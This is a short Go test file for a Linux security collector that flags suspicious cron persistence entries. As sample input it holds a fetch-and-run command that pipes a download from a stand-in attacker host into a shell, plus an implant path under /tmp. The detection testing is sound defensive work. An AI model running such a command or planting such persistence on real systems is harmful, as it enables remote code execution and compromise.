//go:build linux

package collector

import "testing"

func TestPersistenceFindings(t *testing.T) {
	// persistenceFindings receives the command after the schedule is stripped
	// (as parseCronLine / parseUnitExecStarts produce it). An implant from /tmp
	// flags an unusual path.
	got := rulesOf(persistenceFindings("cron (/etc/crontab)", "/tmp/.x/implant"))
	if _, ok := got["persistence.unusual_path"]; !ok {
		t.Errorf("implant in /tmp should flag persistence.unusual_path, got %v", keys(got))
	}
	// A fetch-and-run in a crontab is caught by the shared command analytics.
	got = rulesOf(persistenceFindings("cron (user:bob)", "curl http://evil.example/x | sh"))
	if _, ok := got["exec.download_pipe_shell"]; !ok {
		t.Errorf("curl|sh in cron should flag, got %v", keys(got))
	}
	// An ordinary system cron command is quiet.
	if got := persistenceFindings("cron (/etc/crontab)", "run-parts --report /etc/cron.hourly"); len(got) != 0 {
		t.Errorf("ordinary cron command should be quiet, got %v", got)
	}
}
